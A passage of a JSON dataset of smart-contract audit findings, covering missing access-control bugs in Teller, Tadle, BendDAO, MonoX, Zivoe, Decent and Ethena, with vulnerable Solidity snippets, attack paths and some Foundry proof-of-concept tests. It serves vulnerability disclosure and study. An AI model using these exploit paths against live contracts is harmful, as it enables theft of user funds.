      "content": "Source: https://github.com/sherlock-audit/2024-11-teller-finance-update-judging/issues/37 \n\n## Found by \nPeterSR, hash\n### Summary\n\nLack of access control in `revokeLender` allows an attacker to revoke any participant from a market\n\n### Root Cause\n\nThe [delegation version](https://github.com/sherlock-audit/2024-11-teller-finance-update/blob/0c8535728f97d37a4052d2a25909d28db886a422/teller-protocol-v2-audit-2024/packages/contracts/contracts/MarketRegistry.sol#L332-L338) of the `revokeLender` function fails to perform any access control checks allowing any user to revoke any user\n\n```solidity\n    function _revokeStakeholderViaDelegation(\n        uint256 _marketId,\n        address _stakeholderAddress,\n        bool _isLender,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) internal {\n        bytes32 uuid = _revokeStakeholderVerification(\n            _marketId,\n            _stakeholderAddress,\n            _isLender\n        );\n        // NOTE: Disabling the call to revoke the attestation on EAS contracts\n        //        address attestor = markets[_marketId].owner;\n        //        tellerAS.revokeByDelegation(uuid, attestor, _v, _r, _s);\n    }\n```\n\n### Internal pre-conditions\n\nAttestation should be enabled to observe the impact\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\n1. Attacker calls `revokeLender` by passing in any address they wish to revoke from the market\n\n### Impact\n\nAttacker can revoke any address they wish from any market making the market unuseable\n\n### PoC\n\n_No response_\n\n### Mitigation\n\nPerform access control checks",
      "summary": "\nThis bug report discusses a vulnerability in the `revokeLender` function of the Teller Finance market. This function does not perform proper access control checks, allowing any user to revoke any other user from the market. This can be exploited by an attacker to make the market unusable. The report recommends implementing access control checks to mitigate this issue.",
      "report_date": {},
      "contest_prize_txt": "26500 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/472",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-11-teller-finance-update-judging/issues/37",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "472",
      "slug": "m-3-attacker-can-revoke-any-user-from-a-market-sherlock-teller-lender-groups-update-audit-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Teller Lender Groups Update Audit",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Teller Lender Groups Update Audit",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "38059",
      "kind": "GIT",
      "auditfirm_id": "20",
      "impact": "HIGH",
      "finders_count": 118,
      "protocol_id": "1615",
      "title": "Incorrect set up and logic of `referralInfoMap` in `SystemConfig::updateReferrerInfo` function",
      "content": "## Summary\n- The `referralInfo` contains 3 members: `referrer`, `referrerRate` and `authorityRate`.\n- Here referrer is the person which has referred the other person.\n- The referralInfoMap contains a mapping from an address to `ReferralInfo`, where it is expected to return the 3 members mentioned above for a person who is referred by the `referrer`, but the `referralInfoMap` sets the referrer address to all the 3 members which is incorrect.\n- As well as anyone can call the function to update the mapping for any address and set arbitrary value for whole mapping members as well as the address for which the mapping is mapped to `referralInfo`\n\n## Vulnerability Details\n- The vulnerability is present in the `updateReferrerInfo` function where it allows the caller to set up any arbitrary values for the `referrer`, `referrerRate` and `authorityRate`, as well as the address for which mapping is mapped from is also set to as `referrer`.\n- As a result of which anyone can maliciously set values for anyone, but where it is expected that the referrer should only be able to set value for the person to whom he is referring.\n- When a user calls the `updateReferrerInfo` function, it sets the mapping as `referralInfoMap[referrer]`, and sets up all the values as passed.\n\n- The referral bonus is allocated during the call to `createTaker` via `_updateReferralBonus` function, where it uses the values as:\n```\nreferralInfoMap[msg.sender], where msg.sender is the one to whom referrer has referred to\n```\n- The vulnerability occurs due to the fact that the function allows to set the referrer to any arbitrary address by the caller to their own referral, where it was expected that the referrer should be the `msg.sender` and the caller sets up the mapping's  address from which is mapped to the authority rate which is expected to be passed in the function instead of referrer.\n\nTherefore, it was expected that the caller for `updateReferrerInfo` function should only be the referrer and sets the authority to whom he is referring to.\n\n\n## Impact\n- Incorrect values are set in the `referralInfoMap` which leads to incorrect allocation in `createTaker` function's referral allocation.\n- As a user can call the function with any arbitrary address, therefore they can set up their own other address as referrer where `referrer` as well as the authority to whom referrer is expected to refer to is set to a single address, so a user gets whole discount on platform fee for both referrer and their own (i.e. authority).\n- Also, anyone can front-run the `updateReferrerInfo` function before a user calls `createTaker` and can maliciously update the authorityRate or the referralRate as a result of which the taker will experience different results.\n\n## Tools Used\nManual Review\n\n## Recommendations\nMake the referrer to call the `updateReferrerInfo` as msg.sender, and pass `authority` as a parameter to be set up as the one to whom referrer is referring to.",
      "summary": "\nThe bug report discusses an issue with the `referralInfoMap` in the `SystemConfig::updateReferrerInfo` function. The problem is that the function allows anyone to set arbitrary values for the `referrer`, `referrerRate`, and `authorityRate`, and the address for which the mapping is set is also incorrect. This can lead to incorrect allocation of referral bonuses and someone can even set their own address as the referrer, resulting in receiving discounts for both themselves and the referrer. The report suggests making the referrer call the function as `msg.sender` and passing the authority as a parameter to avoid these issues. ",
      "report_date": {},
      "contest_prize_txt": "30000 USDC",
      "contest_link": "https://codehawks.cyfrin.io/c/clzcnh4o1000p11vucwtzgoro",
      "sponsor_name": "Tadle",
      "sponsor_link": "",
      "quality_score": 4,
      "general_score": 3,
      "source_link": "",
      "github_link": "https://github.com/Cyfrin/2024-08-tadle",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "clzcnh4o1000p11vucwtzgoro",
      "slug": "incorrect-set-up-and-logic-of-referralinfomap-in-systemconfigupdatereferrerinfo-function-codehawks-tadle-git",
      "firm_name": "Codehawks",
      "firm_logo_square": "codehawks_square.png",
      "protocol_name": "Tadle",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Codehawks",
        "logo_square": "codehawks_square.png"
      },
      "protocols_protocol": {
        "name": "Tadle",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Validation"
          }
        },
        {
          "tags_tag": {
            "title": "msgSender"
          }
        },
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "36881",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 3,
      "protocol_id": "1606",
      "title": "[H-07] Anyone can get the NFT collateral token after an Auction without bidding due to missing check on `msg.sender`",
      "content": "\n<https://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/IsolateLogic.sol#L477>\n\nIn IsolateLogic.sol, liquidation of an isolate loan can only be placed after the auction period is passed with bidding. The problem is that there is a missing check on `msg.sender` in isolate liquidation flow, which allows anyone to take the collateral NFT token.\n\n```solidity\n//src/libraries/logic/IsolateLogic.sol\n  function executeIsolateLiquidate(InputTypes.ExecuteIsolateLiquidateParams memory params) internal {\n  ...\n    if (params.supplyAsCollateral) {\n        //@audit due to no check on msg.sender, anyone calls isolateLiquidate will get the collateral nft\n |>     VaultLogic.erc721TransferIsolateSupplyOnLiquidate(nftAssetData, params.msgSender, params.nftTokenIds);\n    } else {\n      VaultLogic.erc721DecreaseIsolateSupplyOnLiquidate(nftAssetData, params.nftTokenIds);\n\n |>     VaultLogic.erc721TransferOutLiquidity(nftAssetData, params.msgSender, params.nftTokenIds);\n    }\n  ...\n```\n\nhttps://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/IsolateLogic.sol#L473\n\nFlows: `IsolateLiquidation::isolateLiquidate -> IsolateLogic.executeIsolateLiquidate()`. Note that `msg.sender` is passed from `isolateLiquidate()` to the end of `executeIsolateLiquidate()` without any checks.\n\n### Proof of Concept\n\nSee added unit test `test_Anyone_Can_LiquidateWETH()`. Only `tsLiquidator1` auctioned, but `tsBorrower2` can liquidate and receive collaterals:\n\n```solidity\n//test/integration/TestIntIsolateLiquidate.t.sol\n...\n  function test_Anyone_Can_LiquidateWETH() public {\n    TestCaseLocalVars memory testVars;\n\n    // deposit\n    prepareWETH(tsDepositor1);\n    uint256[] memory tokenIds = prepareIsolateBAYC(tsBorrower1);\n\n    // borrow\n    prepareBorrow(tsBorrower1, address(tsBAYC), tokenIds, address(tsWETH));\n\n    // make some interest\n    advanceTimes(365 days);\n\n    // drop down nft price\n    actionSetNftPrice(address(tsBAYC), 5000);\n\n    // auction\n    prepareAuction(tsLiquidator1, address(tsBAYC), tokenIds, address(tsWETH));\n\n    // end the auction\n    advanceTimes(25 hours);\n\n    uint256[] memory liquidateAmounts = new uint256[](tokenIds.length);\n    testVars.loanDataBefore = getIsolateLoanData(tsCommonPoolId, address(tsBAYC), tokenIds);\n    for (uint256 i = 0; i < tokenIds.length; i++) {\n      testVars.totalBidAmount += testVars.loanDataBefore[i].bidAmount;\n      testVars.totalBidFine += testVars.loanDataBefore[i].bidFine;\n      testVars.totalRedeemAmount += testVars.loanDataBefore[i].redeemAmount;\n      testVars.totalBorrowAmount += testVars.loanDataBefore[i].borrowAmount;\n    }\n\n    testVars.poolBalanceBefore = tsWETH.balanceOf(address(tsPoolManager));\n    testVars.walletBalanceBefore1 = tsWETH.balanceOf(address(tsLiquidator1));\n    testVars.walletBalanceBefore2 = tsWETH.balanceOf(address(tsBorrower1));\n    testVars.erc721BalanceBefore1 = tsBAYC.balanceOf(address(tsLiquidator1));\n\n    // liquidate\n    // note: check tsBorrower2 can liquidate and receive nfts without bidding.\n    tsBorrower2.isolateLiquidate(tsCommonPoolId, address(tsBAYC), tokenIds, address(tsWETH), liquidateAmounts, false);\n    testVars.erc721BalanceAfter1 = tsBAYC.balanceOf(address(tsBorrower2));\n    assertEq(\n      testVars.erc721BalanceAfter1,\n      (testVars.erc721BalanceBefore1 + tokenIds.length),\n      'tsLiquidator1 bayc balance'\n    );\n\n    }\n...\n```\n\nRun test `forge test --match-contract TestIntIsolateLiquidate --match-test test_Anyone_Can_LiquidateWETH`:\n\n```\nRan 1 test for test/integration/TestIntIsolateLiquidate.t.sol:TestIntIsolateLiquidate\n[PASS] test_Anyone_Can_LiquidateWETH() (gas: 1671088)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 21.76ms (3.41ms CPU time)\n```\n\n### Recommended Mitigation Steps\n\nAdd check `msg.Sender` is the `lastBidder`.\n\n### Assessed type\n\nAccess Control\n\n**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/14#issuecomment-2297853677):**\n > Fixed [here](https://github.com/BendDAO/bend-v2/commit/79c5e34248949871cae035c573ca256f3178da84).\n\n***\n\n",
      "summary": "\nSummary:\n\nThe bug is in the IsolateLogic.sol file, where a missing check on `msg.sender` allows anyone to take the collateral NFT token during the liquidation of an isolate loan. This means that even if someone did not participate in the auction, they can still receive the collateral. A proof of concept test was provided to demonstrate this issue. The recommended mitigation step is to add a check to ensure that `msg.sender` is the last bidder. This issue falls under the category of Access Control. The bug has been fixed in the code.",
      "report_date": {},
      "contest_prize_txt": "64000",
      "contest_link": "https://code4rena.com/reports/2024-07-benddao",
      "sponsor_name": "BendDAO",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/14",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "413",
      "slug": "h-07-anyone-can-get-the-nft-collateral-token-after-an-auction-without-bidding-due-to-missing-check-on-msgsender-code4rena-benddao-benddao-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "BendDAO",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "BendDAO",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Lending"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "50182",
      "kind": "MARKDOWN",
      "auditfirm_id": "4",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "432",
      "title": "ROLE-BASED ACCESS CONTROL MISSING",
      "content": "##### Description\n\nIn smart contracts, implementing a correct Access Control policy is an essential step to maintain security and decentralization for permissions on a token. All the features of the smart contract , such as mint/burn tokens and pause contracts are given by Access Control. For instance, Ownership is the most common form of Access Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Nevertheless, other authorization levels are required to follow the principle of least privilege, also known as least authority. Briefly, any process, user or program only can access to the necessary resources or information. Otherwise, the ownership role is useful in a simple system, but more complex projects require the use of more roles by using Role-based access control.\n\nCode Location\n-------------\n\n#### Monoswap.sol\n\n```\nfunction setFeeTo (address _feeTo) onlyOwner external {\n    feeTo = _feeTo;\n}\n\nfunction setFees (uint16 _fees) onlyOwner external {\n    require(_fees<1e3, \"fees too large\");\n    fees = _fees;\n}\n\nfunction setDevFee (uint16 _devFee) onlyOwner external {\n    require(_devFee<1e3, \"devFee too large\");\n    devFee = _devFee;\n}\n\n// update status of a pool. onlyOwner.\nfunction updatePoolStatus(address _token, PoolStatus _status) public onlyOwner {\n    PoolInfo storage pool = pools[_token];\n    pool.status = _status;\n}\n\n/**\n @dev update pools price if there were no active trading for the last 6000 blocks\n @notice Only owner callable, new price can neither be 0 nor be equal to old one\n @param _token pool identifider (token address)\n @param _newPrice new price in wei (uint112)\n*/\nfunction updatePoolPrice(address _token, uint112 _newPrice) public onlyOwner {\n    require(_newPrice > 0, 'Monoswap: zeroPriceNotAccept');\n\n```\n\n##### Score\n\nImpact: 4  \nLikelihood: 4\n\n##### Recommendation\n\n**SOLVED**: Fixed in commit #635a4cee2f2e50d854e06cac47c48aa0fafde2b0. Several new roles were introduced.",
      "summary": "\nThe report highlights a bug in a smart contract called Monoswap.sol. This contract is used for accessing and managing tokens. The bug relates to the Access Control policy, which is important for maintaining security and decentralization in the contract. The code for the contract is given, and the bug is identified in the function \"updatePoolPrice\". The bug allows anyone to update the pool price, instead of just the owner. This can lead to unauthorized changes in the contract and compromise its security. The bug has been given a score of 4 for impact and likelihood, indicating that it is a significant issue that needs to be addressed. The recommendation for fixing the bug is to introduce new roles in the contract, which has been done in a recent update.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://www.halborn.com/audits/monox/monox-smart-contract-security-assessment",
      "sponsor_name": "MonoX",
      "sponsor_link": "",
      "quality_score": 4,
      "general_score": 0,
      "source_link": "https://www.halborn.com/audits/monox/monox-smart-contract-security-assessment",
      "github_link": "",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "",
      "slug": "role-based-access-control-missing-halborn-monox-monox-markdown",
      "firm_name": "Halborn",
      "firm_logo_square": "halborn_square.png",
      "protocol_name": "MonoX",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Halborn",
        "logo_square": "halborn_square.png"
      },
      "protocols_protocol": {
        "name": "MonoX",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Leveraged Farming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "32395",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "HIGH",
      "finders_count": 46,
      "protocol_id": "1343",
      "title": "H-1: Anyone could call `depositReward` with zero reward to extend the period finish time",
      "content": "Source: https://github.com/sherlock-audit/2024-03-zivoe-judging/issues/11 \n\n## Found by \n0brxce, 0xAnmol, 0xboriskataa, 0xpiken, 0xvj, 14si2o\\_Flint, 9oelm, AMOW, Afriaudit, Bauer, CL001, Dliteofficial, Drynooo, FastTiger, Ironsidesec, Krace, Kunhah, Maniacs, Nihavent, Ruhum, SilverChariot, Timenov, Tychai0s, amar, araj, asui, blockchain555, cergyk, coffiasd, dany.armstrong90, dimulski, forgebyola, heedfxn, jasonxiale, joicygiore, krikolkk, lemonmon, marchev, mt030d, novaman33, pashap9990, rbserver, sakshamguruji, sl1, sunill\\_eth, t0x1c\n## Summary\n\nAnyone could extend the reward finish time, potentially resulting in users receiving fewer rewards than expected within the same time period.\n\n## Vulnerability Detail\n\nThe function `depositReward` can be called by anyone, even with zero rewards, allowing it to be exploited to extend the reward finish time at little cost. \nThis could result in loss of rewards; for instance, if there are 10 DAI rewards within a 10-day period, a malicious user could extend the finish time on *day 5*, extending the finish time to the 15th day. Participants would only receive 7.5 DAI by the 10th day.\n\n```solidity\n    function depositReward(address _rewardsToken, uint256 reward) external updateReward(address(0)) nonReentrant {\n        IERC20(_rewardsToken).safeTransferFrom(_msgSender(), address(this), reward);\n\n        // Update vesting accounting for reward (if existing rewards being distributed, increase proportionally).\n        if (block.timestamp >= rewardData[_rewardsToken].periodFinish) {\n            rewardData[_rewardsToken].rewardRate = reward.div(rewardData[_rewardsToken].rewardsDuration);\n        } else {\n            uint256 remaining = rewardData[_rewardsToken].periodFinish.sub(block.timestamp);\n            uint256 leftover = remaining.mul(rewardData[_rewardsToken].rewardRate);\n            rewardData[_rewardsToken].rewardRate = reward.add(leftover).div(rewardData[_rewardsToken].rewardsDuration);\n        }\n\n        rewardData[_rewardsToken].lastUpdateTime = block.timestamp;\n        rewardData[_rewardsToken].periodFinish = block.timestamp.add(rewardData[_rewardsToken].rewardsDuration);\n        emit RewardDeposited(_rewardsToken, reward, _msgSender());\n    }\n```\n\n### POC\nAdd the test to `zivoe-core-testing/src/TESTS_Core/Test_ZivoeRewards.sol` and run it with `forge test --match-test test_ZivoeRewards_deposit_zero --rpc-url <RPC_URL_MAINNET>`\n\n```diff\ndiff --git a/zivoe-core-testing/src/TESTS_Core/Test_ZivoeRewards.sol b/zivoe-core-testing/src/TESTS_Core/Test_ZivoeRewards.sol\nindex f5353b6..870a531 100644\n--- a/zivoe-core-testing/src/TESTS_Core/Test_ZivoeRewards.sol\n+++ b/zivoe-core-testing/src/TESTS_Core/Test_ZivoeRewards.sol\n@@ -685,6 +685,33 @@ contract Test_ZivoeRewards is Utility {\n\n     }\n\n+    function test_ZivoeRewards_deposit_zero() public {\n+\n+        depositReward_DAI(address(stZVE), 1);\n+\n+        (\n+            uint256 rewardsDuration,\n+            uint256 _prePeriodFinish,\n+            uint256 _preRewardRate,\n+            uint256 lastUpdateTime,\n+            uint256 rewardPerTokenStored\n+        ) = stZVE.rewardData(DAI);\n+        console.log(\"period finish \", _prePeriodFinish);\n+\n+        vm.warp(block.timestamp + 1 days);\n+\n+        depositReward_DAI(address(stZVE), 0);\n+\n+        (,\n+            uint256 _afterPeriodFinish,\n+            ,\n+            ,\n+        ) = stZVE.rewardData(DAI);\n+        console.log(\"period finish \", _afterPeriodFinish);\n+        //  extend the Finish 1 day\n+        assertEq(_afterPeriodFinish - _prePeriodFinish, 1 days);\n+    }\n+\n     function test_ZivoeRewards_getRewards_works(uint96 random) public {\n\n         uint256 deposit = uint256(random) + 100 ether; // Minimum 100 DAI deposit.\n```\n\n## Impact\n\nAnyonce could extend the reward finish time and the users may receive less rewards than expected during the same time period.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-03-zivoe/blob/d4111645b19a1ad3ccc899bea073b6f19be04ccd/zivoe-core-foundry/src/ZivoeRewards.sol#L228-L243\n\n## Tool used\n\nFoundry\n\n## Recommendation\nOnly specific users are allowed to call function `depositReward`\n\n\n\n## Discussion\n\n**pseudonaut**\n\nValid, considering adding whitelist\n\n**sherlock-admin3**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**panprog** commented:\n> high, allows anyone to extend reward finish time indefinitely and decrease reward rate.\n\n\n\n**sherlock-admin2**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/Zivoe/zivoe-core-foundry/pull/260",
      "summary": "\nThis bug report is about a vulnerability found in the Zivoe protocol. The issue is that anyone can call a function called `depositReward` with zero rewards, which can extend the period of time for receiving rewards. This means that participants may receive fewer rewards than expected within the same time period. The vulnerability was found by a group of individuals and it was tested using a tool called Foundry. The team behind the protocol has fixed the issue by adding a whitelist of specific users who are allowed to call the function.",
      "report_date": {},
      "contest_prize_txt": "47500 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/280",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-03-zivoe-judging/issues/11",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "280",
      "slug": "h-1-anyone-could-call-depositreward-with-zero-reward-to-extend-the-period-finish-time-sherlock-zivoe-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Zivoe",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Zivoe",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "RWA"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "30559",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 75,
      "protocol_id": "1251",
      "title": "[H-01] Anyone can update the address of the Router in the DcntEth contract to any address they would like to set.",
      "content": "\nBy allowing anybody to set the address of the Router contract to any address they want to set it allows malicious users to get access to the mint and burn functions of the DcntEth contract.\n\n### Proof of Concept\n\nThe [`DcntEth::setRouter() function`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DcntEth.sol#L20-L22) has not an access control to restrict who can call this function. This allows anybody to set the address of the router contract to any address they'd like to set it.\n\n> DcntEth.sol\n\n```solidity\n//@audit-issue => No access control to restrict who can set the address of the router contract\nfunction setRouter(address _router) public {\n    router = _router;\n}\n```\n\nThe functions [`DcntEth::mint() function`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DcntEth.sol#L24-L26) & [`DcntEth::burn() function`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DcntEth.sol#L28-L30) can be called only by the router contract.\n\n> DcntEth.sol\n\n```solidity\n\n    //@audit-info => Only the router can call the mint()\n    function mint(address _to, uint256 _amount) public onlyRouter {\n        _mint(_to, _amount);\n    }\n\n    //@audit-info => Only the router can call the burn()\n    function burn(address _from, uint256 _amount) public onlyRouter {\n        _burn(_from, _amount);\n    }\n```\n\nA malicious user can set the address of the router contract to an account of their own and:\n\n1.  Gain access to mint unlimited amounts of DcntEth token, which could be used to disrupt the crosschain accounting mechanism, or to steal the deposited weth in the DecentEthRouter contract.\n2.  Burn all the DcntEth tokens that were issued to the DecentEthRouter contract when liquidity providers deposited their WETH or ETH into it.\n3.  Cause a DoS to the add and remove liquidity functions of the DecentEthRouter contract. All of these functions end up calling the [`DcntEth::mint() function`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DcntEth.sol#L24-L26) or the [`DcntEth::burn() function`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DcntEth.sol#L28-L30), if the router address is set to be different than the address of the DecentEthRouter, all the calls made from the DecentEthRouter to the DcnEth contract will revert.\n\n> DecentEthRouter.sol\n\n<details>\n\n```solidity\n\n    /// @inheritdoc IDecentEthRouter\n    function addLiquidityEth()\n        public\n        payable\n        onlyEthChain\n        userDepositing(msg.value)\n    {\n        weth.deposit{value: msg.value}();\n        \n        //@audit-issue => If router in the dcnteth contract is not set to the address of the DecentEthRouter, this call will revert\n        dcntEth.mint(address(this), msg.value);\n    }\n\n    /// @inheritdoc IDecentEthRouter\n    function removeLiquidityEth(\n        uint256 amount\n    ) public onlyEthChain userIsWithdrawing(amount) {\n\n      //@audit-issue => If router in the dcnteth contract is not set to the address of the DecentEthRouter, this call will revert\n        dcntEth.burn(address(this), amount);\n        weth.withdraw(amount);\n        payable(msg.sender).transfer(amount);\n    }\n\n    /// @inheritdoc IDecentEthRouter\n    function addLiquidityWeth(\n        uint256 amount\n    ) public payable userDepositing(amount) {\n        weth.transferFrom(msg.sender, address(this), amount);\n\n        //@audit-issue => If router in the dcnteth contract is not set to the address of the DecentEthRouter, this call will revert\n        dcntEth.mint(address(this), amount);\n    }\n\n    /// @inheritdoc IDecentEthRouter\n    function removeLiquidityWeth(\n        uint256 amount\n    ) public userIsWithdrawing(amount) {\n\n      //@audit-issue => If router in the dcnteth contract is not set to the address of the DecentEthRouter, this call will revert\n        dcntEth.burn(address(this), amount);\n        weth.transfer(msg.sender, amount);\n    }\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\nMake sure to add an Acess Control mechanism to limit who can set the address of the Router in the DcnEth contract.\n\n\n**[0xsomeone (Judge) commented](https://github.com/code-423n4/2024-01-decent-findings/issues/721#issuecomment-1925323247):**\n > This and all relevant submissions correctly specify that the lack of access control in the `DcntEth::setRouter` function can be exploited maliciously and effectively compromise the entire TVL of the Decent ETH token.\n> \n> A high-risk severity is appropriate, and this submission was selected as the best due to detailing all possible impacts:\n> \n> - Arbitrary mints of the token to withdraw funds provided as liquidity to `UTB`\n> - Arbitrary burns to sabotage liquidity pools and other escrow-based contracts\n> - Sabotage of liquidity provision function invocations\n\n**[wkantaros (Decent) confirmed](https://github.com/code-423n4/2024-01-decent-findings/issues/721#issuecomment-1942664512)**\n\n***\n\n",
      "summary": "\nThe report details a bug in the DcntEth contract, which allows anyone to set the address of the Router contract to any address they want. This can be exploited by malicious users to gain access to the mint and burn functions of the DcntEth contract. This could lead to various consequences such as disrupting the crosschain accounting mechanism, stealing deposited funds, or causing a denial of service attack. The report recommends implementing an access control mechanism to limit who can set the address of the Router in the DcntEth contract. This bug has been confirmed by the Decent team and has been classified as high-risk.",
      "report_date": {},
      "contest_prize_txt": "36500",
      "contest_link": "https://code4rena.com/reports/2024-01-decent",
      "sponsor_name": "Decent",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2024-01-decent",
      "github_link": "https://github.com/code-423n4/2024-01-decent-findings/issues/721",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "322",
      "slug": "h-01-anyone-can-update-the-address-of-the-router-in-the-dcnteth-contract-to-any-address-they-would-like-to-set-code4rena-decent-decent-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Decent",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Decent",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 1391.208791137663
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 1391.208791137663
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "29385",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 20,
      "protocol_id": "1135",
      "title": "[M-02] Soft Restricted Staker Role can withdraw stUSDe for USDe",
      "content": "\nA requirement is stated that a user with the `SOFT_RESTRICTED_STAKER_ROLE` is not allowed to withdraw `USDe` for `stUSDe`.\n\nThe code does not satisfy that condition, when a holder has the `SOFT_RESTRICTED_STAKER_ROLE`, they can exchange their `stUSDe` for `USDe` using `StakedUSDeV2`.\n\n### Description\n\nThe Ethena readme has the following decription of legal requirements for the Soft Restricted Staker Role: <br><https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/README.md?plain=1#L98>\n\n    Due to legal requirements, there's a `SOFT_RESTRICTED_STAKER_ROLE` and `FULL_RESTRICTED_STAKER_ROLE`. \n    The former is for addresses based in countries we are not allowed to provide yield to, for example USA. \n    Addresses under this category will be soft restricted. They cannot deposit USDe to get stUSDe or withdraw stUSDe for USDe. \n    However they can participate in earning yield by buying and selling stUSDe on the open market.\n\nIn summary, legal requires are that a `SOFT_RESTRICTED_STAKER_ROLE`:\n\n*   MUST NOT deposit USDe to get stUSDe\n*   MUST NOT withdraw USDe for USDe\n*   MAY earn yield by trading stUSDe on the open market\n\nAs `StakedUSDeV2` is a `ERC4626`, the `stUSDe` is a share on the underlying `USDe` asset. There are two distinct entrypoints for a user to exchange their share for their claim on the underlying the asset, `withdraw` and `redeem`. Each cater for a different input (`withdraw` being by asset, `redeem` being by share), however both invoked the same internal `_withdraw` function, hence both entrypoints are affected.\n\nThere are two cases where a user with `SOFT_RESTRICTED_STAKER_ROLE` may have acquired `stUSDe`:\n\n*   Brought `stUSDe` on the open market\n*   Deposited `USDe` in `StakedUSDeV2` before being granted the `SOFT_RESTRICTED_STAKER_ROLE`\n\nIn both cases the user can call either withdraw their holding by calling `withdraw` or `redeem` (when cooldown is off), or `unstake` (if cooldown is on) and successfully exchange their `stUSDe` for 